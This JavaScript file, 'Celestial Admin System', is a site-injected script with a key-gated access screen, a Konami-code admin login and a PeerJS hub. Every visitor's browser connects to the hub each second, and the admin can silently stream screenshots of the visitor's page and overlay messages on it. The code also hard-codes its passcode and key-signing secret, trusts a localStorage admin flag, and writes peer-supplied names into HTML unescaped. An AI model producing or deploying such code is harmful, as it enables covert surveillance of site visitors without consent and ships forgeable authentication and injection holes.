/* ============================================================
   CELESTIAL ADMIN SYSTEM v1
   Konami: ← → ← → ↑ ↓ A B  →  passcode  →  admin panel
   ============================================================ */
(function () {
  'use strict';

  const SEQ   = ['ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','ArrowUp','ArrowDown','a','b'];
  const PASS  = 'Hr332941369';
  const HUB   = 'celestial-hub-112456LCD';
  const SEC   = 'Hr332941369'; // signing secret for keys

  let isAdmin    = localStorage.getItem('cst-admin') === '1';
  let buf        = [];
  let hub        = null;          // admin-side PeerJS Peer
  let cPeer      = null;          // client-side PeerJS Peer
  let clients    = {};            // peerId → {conn, vp, url, name}
  let viewTarget = null;
  let admCX = 50, admCY = 50;
  let panelEl = null;

  // ─── tiny hash for key signing ────────────────────────────────
  function H(s) {
    let h = 5381;
    for (let i = 0; i < s.length; i++) h = (Math.imul(h, 33) ^ s.charCodeAt(i)) >>> 0;
    return h.toString(36).toUpperCase().padStart(7, '0');
  }

  function makeKey(name, days) {
    const e = Date.now() + days * 86400000;
    const p = btoa(JSON.stringify({ n: name, e }));
    return p + '.' + H(p + SEC);
  }

  function checkKey(raw) {
    if (!raw) return null;
    try {
      const dot = raw.lastIndexOf('.');
      const p   = raw.slice(0, dot);
      if (H(p + SEC) !== raw.slice(dot + 1)) return null;
      const { n, e } = JSON.parse(atob(p));
      return Date.now() > e ? null : { name: n, expires: e };
    } catch { return null; }
  }

  // ─── auth gate ────────────────────────────────────────────────
  function needsAuth() {
    return !isAdmin && !checkKey(localStorage.getItem('cst-key'));
  }

  function showGate() {
    if (document.getElementById('cst-gate')) return;
    const d = document.createElement('div');
    d.id = 'cst-gate';
    d.innerHTML = `
<style>
#cst-gate{position:fixed;inset:0;z-index:2147483647;background:#040404;
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  font-family:system-ui,sans-serif;}
#cst-gate *{box-sizing:border-box;}
#cst-gate h2{color:#fff;margin:0 0 6px;font-size:1.6rem;letter-spacing:-.03em;}
#cst-gate p{color:#444;font-size:.83rem;margin:0 0 24px;}
#cg-inp{background:#0d0d0d;border:1px solid #1e1e1e;color:#fff;
  padding:11px 16px;border-radius:7px;font-size:.95rem;width:290px;outline:none;
  font-family:monospace;letter-spacing:.05em;margin-bottom:10px;}
#cg-inp:focus{border-color:#333;}
#cg-btn{width:290px;padding:11px;background:#111;color:#bbb;
  border:1px solid #222;border-radius:7px;cursor:pointer;font-size:.88rem;}
#cg-btn:hover{background:#181818;}
#cg-err{font-size:.75rem;color:#ff4444;margin-top:8px;min-height:18px;}
</style>
<h2>celestial.</h2>
<p>access key required to continue</p>
<input id="cg-inp" placeholder="paste your access key" autocomplete="off"/>
<button id="cg-btn">continue</button>
<div id="cg-err"></div>`;
    document.body.appendChild(d);
    const inp = d.querySelector('#cg-inp');
    const err = d.querySelector('#cg-err');
    const go  = () => {
      const k = inp.value.trim();
      if (checkKey(k)) {
        localStorage.setItem('cst-key', k);
        d.remove();
        window.__cstBeaconHello?.();
      } else {
        err.textContent = k ? 'invalid or expired key.' : 'enter a key first.';
        inp.style.borderColor = '#ff3333';
        setTimeout(() => { inp.style.borderColor = ''; err.textContent = ''; }, 2500);
      }
    };
    d.querySelector('#cg-btn').onclick = go;
    inp.addEventListener('keydown', e => { if (e.key === 'Enter') go(); });
    inp.focus();
  }

  // ─── konami listener ──────────────────────────────────────────
  document.addEventListener('keydown', e => {
    if (document.activeElement.matches('input,textarea,select,[contenteditable]')) return;
    buf.push(e.key);
    if (buf.length > SEQ.length) buf.shift();
    if (JSON.stringify(buf) === JSON.stringify(SEQ)) {
      buf = [];
      doLogin();
    }
  }, true);

  function doLogin() {
    if (isAdmin) { openPanel(); return; }
    const pw = prompt('admin passcode:');
    if (pw === PASS) {
      isAdmin = true;
      localStorage.setItem('cst-admin', '1');
      document.getElementById('cst-gate')?.remove();
      openPanel();
    } else if (pw !== null) {
      alert('incorrect passcode.');
    }
  }

  // ─── admin panel ──────────────────────────────────────────────
  function openPanel() {
    if (panelEl) { panelEl.style.display = 'flex'; return; }
    buildPanel();
    startHub();
  }

  function buildPanel() {
    panelEl = document.createElement('div');
    panelEl.id = 'cst-panel';
    panelEl.innerHTML = `
<style>
#cst-panel{position:fixed;inset:0;z-index:2147483646;background:#080808;
  display:flex;flex-direction:column;font-family:system-ui,sans-serif;color:#ccc;}
#cst-panel *{box-sizing:border-box;}
#cp-bar{display:flex;align-items:center;gap:12px;padding:10px 18px;
  background:#040404;border-bottom:1px solid #161616;flex-shrink:0;}
#cp-bar h2{margin:0;font-size:.93rem;color:#fff;}
.cp-badge{font-size:.68rem;padding:2px 8px;border-radius:3px;
  border:1px solid #3a0000;background:#160000;color:#ff5555;}
#cp-hub{font-size:.7rem;padding:2px 8px;border-radius:3px;
  border:1px solid #1e1e1e;background:#0d0d0d;color:#444;}
#cp-hub.on{border-color:#003300;background:#001000;color:#44ff88;}
.cp-x{margin-left:auto;background:none;border:none;color:#444;
  font-size:1.2rem;cursor:pointer;padding:4px 8px;line-height:1;}
.cp-x:hover{color:#fff;}
#cp-body{display:flex;flex:1;min-height:0;}
#cp-nav{width:162px;padding:10px 0;border-right:1px solid #161616;
  display:flex;flex-direction:column;gap:2px;}
.cn{padding:9px 18px;background:none;border:none;color:#666;cursor:pointer;
  font-size:.83rem;text-align:left;border-left:2px solid transparent;width:100%;}
.cn:hover{color:#ccc;background:#0d0d0d;}
.cn.on{color:#fff;background:#0c0c0c;border-left-color:#cc2222;}
.cn.red{color:#cc3333;}
#cp-main{flex:1;overflow-y:auto;padding:20px;}
.cs{display:none;}
.cs.on{display:block;}
.cb{background:#0c0c0c;border:1px solid #191919;border-radius:8px;padding:16px;margin-bottom:14px;}
.cb h3{margin:0 0 12px;font-size:.88rem;color:#fff;}
.ci{background:#0d0d0d;border:1px solid #222;color:#fff;
  padding:8px 12px;border-radius:5px;font-size:.82rem;outline:none;}
.ci:focus{border-color:#333;}
.cbtn{padding:7px 15px;background:#111;color:#bbb;
  border:1px solid #222;border-radius:5px;cursor:pointer;font-size:.8rem;}
.cbtn:hover{background:#181818;}
.cbtn.g{background:#001200;color:#44ff77;border-color:#003300;}
.cbtn.g:hover{background:#001800;}
.cbtn.r{background:#120000;color:#ff5555;border-color:#300000;}
.cbtn.r:hover{background:#1a0000;}
.crow{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px;}
/* keys */
.ck{background:#0d0d0d;border:1px solid #191919;border-radius:5px;
  padding:10px;margin:3px 0;display:flex;gap:10px;align-items:flex-start;}
.ck-code{font-family:monospace;font-size:.66rem;color:#666;word-break:break-all;flex:1;}
.kb{font-size:.68rem;padding:2px 6px;border-radius:3px;}
.kw{background:#1a1200;color:#ffaa44;border:1px solid #3d2900;}
.ka{background:#001200;color:#44ff77;border:1px solid #003300;}
.ke{background:#120000;color:#ff5555;border:1px solid #300000;}
/* clients */
.ccl{background:#0c0c0c;border:1px solid #191919;border-radius:6px;
  padding:12px;margin:3px 0;cursor:pointer;}
.ccl:hover{border-color:#2a2a2a;}
.ccl.sel{border-color:#cc2222;}
.cn2{font-size:.86rem;color:#fff;font-weight:600;}
.cm{font-size:.72rem;color:#444;margin-top:3px;}
/* viewer */
#cp-viewer{display:none;background:#030303;border:1px solid #191919;
  border-radius:8px;overflow:hidden;margin-top:12px;}
#cp-vc{display:block;width:100%;background:#000;cursor:crosshair;}
#cp-vctrl{padding:10px;background:#060606;display:flex;gap:8px;align-items:center;}
#cp-vctrl .ci{flex:1;}
</style>
<div id="cp-bar">
  <h2>celestial. admin</h2>
  <span class="cp-badge">ADMIN</span>
  <span id="cp-hub">hub offline</span>
  <button class="cp-x" id="cp-close">✕</button>
</div>
<div id="cp-body">
  <div id="cp-nav">
    <button class="cn on" data-s="keys">Key Manager</button>
    <button class="cn" data-s="clients">View Clients</button>
    <button class="cn" data-s="info">Info</button>
    <button class="cn red" id="cp-logout" style="margin-top:auto;">Log Out</button>
  </div>
  <div id="cp-main">

    <!-- KEYS -->
    <div class="cs on" id="cs-keys">
      <div class="cb">
        <h3>Create Key</h3>
        <div class="crow">
          <input class="ci" id="ck-name" placeholder="user name" style="width:145px"/>
          <input class="ci" id="ck-days" type="number" value="7" min="1" style="width:65px"/>
          <button class="cbtn g" id="ck-make">create</button>
        </div>
        <div id="ck-new" style="display:none;margin-top:10px;">
          <p style="font-size:.75rem;color:#555;margin:0 0 6px;">share with user:</p>
          <div id="ck-val" style="background:#080808;border:1px solid #1e1e1e;border-radius:5px;
            padding:10px;font-family:monospace;font-size:.7rem;word-break:break-all;color:#77ffaa;"></div>
          <div class="crow" style="margin-top:8px;">
            <button class="cbtn g" id="ck-copy">copy</button>
            <span id="ck-wait" style="font-size:.73rem;color:#ffaa44;">waiting for use...</span>
          </div>
        </div>
      </div>
      <div class="cb">
        <h3>Keys <span id="ck-cnt" style="color:#444;font-size:.75rem;font-weight:normal;"></span></h3>
        <div id="ck-list"></div>
      </div>
    </div>

    <!-- CLIENTS -->
    <div class="cs" id="cs-clients">
      <div class="cb">
        <h3>Connected Clients</h3>
        <p style="font-size:.76rem;color:#444;margin:0 0 10px;">
          clients auto-connect to hub <code style="color:#666">112456LCD</code> every second. click one to view their screen.
        </p>
        <div id="cp-clist"><p style="color:#333;font-size:.82rem;">no clients connected.</p></div>
      </div>
      <div id="cp-viewer">
        <canvas id="cp-vc"></canvas>
        <div id="cp-vctrl">
          <label style="font-size:.73rem;display:flex;align-items:center;gap:5px;flex-shrink:0;">
            <input type="checkbox" id="cp-showcur" checked/> cursor
          </label>
          <input class="ci" id="cp-msginp" placeholder="type message, press Enter to send"/>
          <button class="cbtn" id="cp-send">send</button>
          <button class="cbtn r" id="cp-stopview">stop</button>
        </div>
      </div>
    </div>

    <!-- INFO -->
    <div class="cs" id="cs-info">
      <div class="cb">
        <h3>System</h3>
        <p style="font-size:.82rem;">hub peer ID: <code id="cp-pid" style="color:#777;">connecting...</code></p>
        <p style="font-size:.82rem;">hub channel: <code style="color:#777;">112456LCD</code></p>
        <p style="font-size:.82rem;color:#444;">code: ← → ← → ↑ ↓ A B, then passcode</p>
      </div>
    </div>

  </div>
</div>`;
    document.body.appendChild(panelEl);

    // nav tabs
    panelEl.querySelectorAll('.cn[data-s]').forEach(b => b.onclick = () => {
      panelEl.querySelectorAll('.cn').forEach(x => x.classList.remove('on'));
      panelEl.querySelectorAll('.cs').forEach(x => x.classList.remove('on'));
      b.classList.add('on');
      document.getElementById('cs-' + b.dataset.s)?.classList.add('on');
    });

    panelEl.querySelector('#cp-close').onclick   = () => panelEl.style.display = 'none';
    panelEl.querySelector('#cp-logout').onclick  = doLogout;
    panelEl.querySelector('#ck-make').onclick    = doMakeKey;
    panelEl.querySelector('#ck-copy').onclick    = () => navigator.clipboard?.writeText(document.getElementById('ck-val').textContent).catch(() => {});

    const vc = panelEl.querySelector('#cp-vc');
    vc.addEventListener('mousemove', e => {
      const r  = vc.getBoundingClientRect();
      admCX = (e.clientX - r.left) / r.width  * 100;
      admCY = (e.clientY - r.top)  / r.height * 100;
      sendTarget({ type: 'cursor', x: admCX, y: admCY });
    });

    panelEl.querySelector('#cp-stopview').onclick = stopView;
    panelEl.querySelector('#cp-send').onclick     = doSendMsg;
    panelEl.querySelector('#cp-msginp').addEventListener('keydown', e => { if (e.key === 'Enter') doSendMsg(); });

    renderKeys();
  }

  function doLogout() {
    isAdmin = false;
    localStorage.removeItem('cst-admin');
    if (hub) { hub.destroy(); hub = null; }
    panelEl?.remove(); panelEl = null;
    document.getElementById('cst-adminbtn')?.remove();
  }

  // ─── key manager ─────────────────────────────────────────────
  function loadKeys() { try { return JSON.parse(localStorage.getItem('cst-keys') || '[]'); } catch { return []; } }
  function saveKeys(k) { localStorage.setItem('cst-keys', JSON.stringify(k)); }

  function doMakeKey() {
    const name = document.getElementById('ck-name').value.trim() || 'user';
    const days = Math.max(1, parseInt(document.getElementById('ck-days').value) || 7);
    const key  = makeKey(name, days);
    const ks   = loadKeys();
    ks.push({ key, name, days, created: Date.now(), used: false });
    saveKeys(ks);
    document.getElementById('ck-new').style.display = 'block';
    document.getElementById('ck-val').textContent   = key;
    document.getElementById('ck-wait').style.display = 'inline';
    renderKeys();
    bcast({ type: 'key-ping' });
  }

  function renderKeys() {
    const list = document.getElementById('ck-list');
    const cnt  = document.getElementById('ck-cnt');
    if (!list) return;
    const ks = loadKeys();
    if (cnt) cnt.textContent = `(${ks.length})`;
    if (!ks.length) { list.innerHTML = '<p style="color:#333;font-size:.8rem;">no keys yet.</p>'; return; }
    list.innerHTML = ks.slice().reverse().map((k, ri) => {
      const i     = ks.length - 1 - ri;
      const dLeft = Math.ceil((k.created + k.days * 86400000 - Date.now()) / 86400000);
      const exp   = dLeft <= 0;
      const cls   = exp ? 'ke' : (k.used ? 'ka' : 'kw');
      const lbl   = exp ? 'expired' : (k.used ? 'in use' : 'waiting');
      return `<div class="ck">
        <div style="flex:1;min-width:0;">
          <div style="font-size:.8rem;color:#aaa;margin-bottom:3px;">${k.name}</div>
          <div class="ck-code">${k.key}</div>
        </div>
        <div style="text-align:right;flex-shrink:0;">
          <span class="kb ${cls}">${lbl}</span>
          <div style="font-size:.68rem;color:#333;margin-top:3px;">${exp ? 'exp' : dLeft + 'd'}</div>
          <button onclick="__cstRevoke(${i})" style="background:none;border:none;color:#2a2a2a;cursor:pointer;font-size:.66rem;margin-top:2px;padding:0;">revoke</button>
        </div>
      </div>`;
    }).join('');
  }

  window.__cstRevoke = i => {
    const ks = loadKeys(); ks.splice(i, 1); saveKeys(ks); renderKeys();
  };

  // ─── hub (admin WebRTC) ──────────────────────────────────────
  function startHub() {
    loadPeerJS(() => {
      tryCreateHub(HUB);
    });
  }

  function tryCreateHub(id) {
    hub = new Peer(id, { debug: 0 });
    hub.on('open', pid => {
      const el = document.getElementById('cp-hub');
      if (el) { el.textContent = 'hub online'; el.className = 'on'; }
      const pi = document.getElementById('cp-pid');
      if (pi) pi.textContent = pid;
    });
    hub.on('connection', conn => {
      conn.on('open', () => {
        const cid = conn.peer;
        clients[cid] = { conn, vp: null, url: '—', name: cid.slice(-6) };
        conn.on('data',  d => onClientData(cid, d));
        conn.on('close', () => { delete clients[cid]; renderClients(); if (viewTarget === cid) stopView(); });
        renderClients();
      });
    });
    hub.on('error', err => {
      if (err.type === 'unavailable-id') {
        hub.destroy();
        tryCreateHub(HUB + '-b');
      }
    });
  }

  function onClientData(cid, d) {
    if (!d || typeof d !== 'object') return;
    const c = clients[cid];
    if (!c) return;
    if (d.type === 'hello') {
      c.vp  = d.vp;
      c.url = d.url || '—';
      if (d.keyName) {
        c.name = d.keyName;
        const ks  = loadKeys();
        const idx = ks.findIndex(k => { const v = checkKey(k.key); return v && v.name === d.keyName && !k.used; });
        if (idx >= 0) {
          ks[idx].used = true; saveKeys(ks); renderKeys();
          document.getElementById('ck-wait').style.display = 'none';
        }
      }
      renderClients();
    }
    if (d.type === 'frame' && viewTarget === cid) {
      const cv = document.getElementById('cp-vc');
      if (!cv) return;
      const img = new Image();
      img.onload = () => { cv.width = img.width; cv.height = img.height; cv.getContext('2d').drawImage(img, 0, 0); };
      img.src = d.data;
    }
  }

  function renderClients() {
    const list = document.getElementById('cp-clist');
    if (!list) return;
    const ids = Object.keys(clients);
    if (!ids.length) { list.innerHTML = '<p style="color:#333;font-size:.82rem;">no clients connected.</p>'; return; }
    list.innerHTML = ids.map(id => {
      const c  = clients[id];
      const vp = c.vp ? `${c.vp.w}×${c.vp.h}` : '?';
      return `<div class="ccl${viewTarget === id ? ' sel' : ''}" onclick="__cstView('${id}')">
        <div class="cn2">${c.name}</div>
        <div class="cm">${vp} · ${c.url}</div>
      </div>`;
    }).join('');
  }

  window.__cstView = id => {
    viewTarget = id;
    const v = document.getElementById('cp-viewer');
    if (v) v.style.display = 'block';
    sendTarget({ type: 'start-cap' });
    renderClients();
  };

  function stopView() {
    if (viewTarget) sendTarget({ type: 'stop-cap' });
    viewTarget = null;
    const v = document.getElementById('cp-viewer');
    if (v) v.style.display = 'none';
    renderClients();
  }

  function sendTarget(msg) {
    if (!viewTarget || !clients[viewTarget]) return;
    try { clients[viewTarget].conn.send(msg); } catch {}
  }

  function bcast(msg) {
    Object.values(clients).forEach(c => { try { c.conn.send(msg); } catch {} });
  }

  function doSendMsg() {
    const inp  = document.getElementById('cp-msginp');
    const text = inp?.value?.trim();
    if (!text || !viewTarget) return;
    sendTarget({ type: 'msg', text, x: admCX, y: admCY });
    inp.value = '';
  }

  // ─── client beacon (user-side) ───────────────────────────────
  function startBeacon() {
    loadPeerJS(() => {
      cPeer = new Peer(undefined, { debug: 0 });
      let adminConn  = null;
      let capturing  = false;
      let capTimer   = null;
      let virCur     = null;
      let msgLayer   = null;
      let lastMsg    = null;
      let styleInjected = false;

      cPeer.on('open', () => {
        tryConnect();
        setInterval(tryConnect, 1000); // check every 1 second silently
      });

      function tryConnect() {
        if (adminConn && adminConn.open) return;
        try {
          adminConn = cPeer.connect(HUB, { reliable: true });
          adminConn.on('open', sendHello);
          adminConn.on('data',  onAdminMsg);
          adminConn.on('close', () => { adminConn = null; stopCap(); hideCur(); });
          adminConn.on('error', () => { adminConn = null; });
        } catch {}
      }

      function sendHello() {
        const kd = localStorage.getItem('cst-key');
        const kv = checkKey(kd);
        if (adminConn?.open) adminConn.send({
          type: 'hello',
          vp:   { w: innerWidth, h: innerHeight },
          url:  location.hostname,
          keyName: kv?.name || null
        });
      }

      window.__cstBeaconHello = sendHello;

      // virtual cursor
      function getCur() {
        if (!virCur) {
          virCur = document.createElement('div');
          virCur.style.cssText = 'position:fixed;z-index:2147483644;pointer-events:none;width:15px;height:15px;' +
            'border-radius:50%;background:rgba(255,50,50,.8);box-shadow:0 0 6px rgba(255,0,0,.7),0 0 16px rgba(255,0,0,.25);' +
            'transform:translate(-50%,-50%);display:none;transition:left .07s,top .07s;';
          document.body.appendChild(virCur);
        }
        return virCur;
      }
      function showCur(x, y) { const c = getCur(); c.style.display = 'block'; c.style.left = x + 'vw'; c.style.top = y + 'vh'; }
      function hideCur() { if (virCur) virCur.style.display = 'none'; }

      // message overlay
      function getLayer() {
        if (!msgLayer) {
          msgLayer = document.createElement('div');
          msgLayer.style.cssText = 'position:fixed;inset:0;z-index:2147483643;pointer-events:none;';
          document.body.appendChild(msgLayer);
        }
        if (!styleInjected) {
          styleInjected = true;
          const st = document.createElement('style');
          st.textContent = `
@keyframes cst-pop{from{transform:translateX(-50%) scale(.55);opacity:0}to{transform:translateX(-50%) scale(1);opacity:1}}
@keyframes cst-fall{to{transform:translateY(110vh) rotate(var(--r));opacity:0}}
.cst-ch{display:inline-block;animation:cst-fall var(--d) ease-in var(--dl) both;}`;
          document.head.appendChild(st);
        }
        return msgLayer;
      }

      function showMsg(text, xp, yp) {
        // push existing message down
        if (lastMsg && lastMsg.parentNode) {
          const t = parseFloat(lastMsg.style.top) + 6;
          lastMsg.style.top = t + '%';
        }
        const el = document.createElement('div');
        el.style.cssText = `position:absolute;left:${xp}%;top:${yp}%;transform:translateX(-50%);
          background:rgba(6,6,6,.92);color:#fff;font-family:system-ui,sans-serif;
          font-size:.84rem;padding:8px 14px;border-radius:7px;border:1px solid rgba(255,50,50,.3);
          max-width:250px;word-break:break-word;white-space:normal;
          animation:cst-pop .22s ease-out;`;
        el.textContent = text;
        getLayer().appendChild(el);
        lastMsg = el;
        setTimeout(() => breakMsg(el), 4000);
      }

      function breakMsg(el) {
        if (!el.parentNode) return;
        const txt = el.textContent;
        el.innerHTML = '';
        [...txt].forEach((ch, i) => {
          const sp = document.createElement('span');
          sp.className = 'cst-ch';
          const r  = (Math.random() * 680 - 340).toFixed(0) + 'deg';
          const d  = (.35 + Math.random() * .55).toFixed(2) + 's';
          const dl = (i * 22) + 'ms';
          sp.style.cssText = `--r:${r};--d:${d};--dl:${dl};`;
          sp.textContent = ch === ' ' ? ' ' : ch;
          el.appendChild(sp);
        });
        setTimeout(() => { el.remove(); if (lastMsg === el) lastMsg = null; }, 1200);
      }

      function onAdminMsg(d) {
        if (!d || typeof d !== 'object') return;
        if (d.type === 'start-cap') { capturing = true; startCap(); showCur(50, 50); }
        if (d.type === 'stop-cap')  { stopCap(); hideCur(); }
        if (d.type === 'cursor')    { showCur(d.x, d.y); }
        if (d.type === 'msg')       { showMsg(d.text, d.x || 50, d.y || 30); }
      }

      function startCap() {
        if (capTimer) return;
        capTimer = setInterval(async () => {
          if (!capturing || !adminConn?.open) return;
          const data = await grab();
          if (data && adminConn?.open) adminConn.send({ type: 'frame', data });
        }, 2000);
      }

      function stopCap() {
        capturing = false;
        if (capTimer) { clearInterval(capTimer); capTimer = null; }
      }

      async function grab() {
        if (!window.html2canvas) {
          await new Promise(res => {
            const s = document.createElement('script');
            s.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
            s.onload = res; s.onerror = res;
            document.head.appendChild(s);
          });
        }
        try {
          const c = await html2canvas(document.body, { scale: .35, logging: false, useCORS: false, allowTaint: true });
          return c.toDataURL('image/jpeg', .45);
        } catch { return null; }
      }
    });
  }

  // ─── PeerJS loader ───────────────────────────────────────────
  function loadPeerJS(cb) {
    if (window.Peer) { cb(); return; }
    const s = document.createElement('script');
    s.src    = 'https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js';
    s.onload = cb;
    s.onerror = () => {};
    document.head.appendChild(s);
  }

  // ─── floating admin button ───────────────────────────────────
  function addAdminBtn() {
    if (document.getElementById('cst-adminbtn')) return;
    const b = document.createElement('button');
    b.id = 'cst-adminbtn';
    b.title   = 'admin panel';
    b.textContent = '⚙';
    b.style.cssText = 'position:fixed;bottom:14px;right:14px;z-index:2147483645;' +
      'width:30px;height:30px;background:#0c0000;color:#cc3333;border:1px solid #280000;' +
      'border-radius:50%;cursor:pointer;font-size:.85rem;opacity:.5;' +
      'display:flex;align-items:center;justify-content:center;';
    b.onmouseenter = () => b.style.opacity = '1';
    b.onmouseleave = () => b.style.opacity = '.5';
    b.onclick = openPanel;
    document.body.appendChild(b);
  }

  // ─── init ────────────────────────────────────────────────────
  function init() {
    if (isAdmin) {
      addAdminBtn();
    } else {
      startBeacon();
      if (needsAuth()) {
        if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', showGate);
        else showGate();
      }
    }
  }

  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();

})();
